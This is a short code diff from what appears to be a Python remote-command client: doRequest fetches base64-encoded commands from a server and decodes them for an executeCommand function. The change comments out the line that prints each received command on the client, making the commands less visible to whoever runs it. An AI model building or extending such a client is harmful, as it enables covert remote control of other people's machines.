@@ -59,7 +59,8 @@ def doRequest(mID, wAddr):
 	r = requests.get(url, headers=headers)
 	commandReturned = r.content.lstrip()
 	commandReturned = base64.b64decode(commandReturned.rstrip())
-	print commandReturned
+	# Uncomment the below line if you would like the command you are executing to display on the client...
+	#print commandReturned
 	return commandReturned
 
 def executeCommand(com):
